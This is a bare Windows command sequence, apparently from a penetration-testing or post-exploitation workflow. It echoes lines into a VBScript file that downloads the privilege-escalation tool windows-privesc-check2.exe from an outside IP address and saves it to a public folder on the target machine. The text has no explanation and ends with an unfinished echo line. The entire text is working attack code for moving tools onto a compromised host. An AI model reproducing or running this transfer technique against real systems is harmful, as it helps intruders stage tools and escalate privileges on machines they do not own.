 echo Set args = Wscript.Arguments  > webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  >> webdl.vbs
 timeout 1
 echo xHttp.Send  >> webdl.vbs
 timeout 1
 echo with bStrm      >> webdl.vbs
 timeout 1
 echo 	.type = 1 '      >> webdl.vbs
 timeout 1
 echo 	.open      >> webdl.vbs
 timeout 1
 echo 	.write xHttp.responseBody      >> webdl.vbs
 timeout 1
 echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
 timeout 1
 echo end with >> webdl.vbs
 timeout 1
 echo
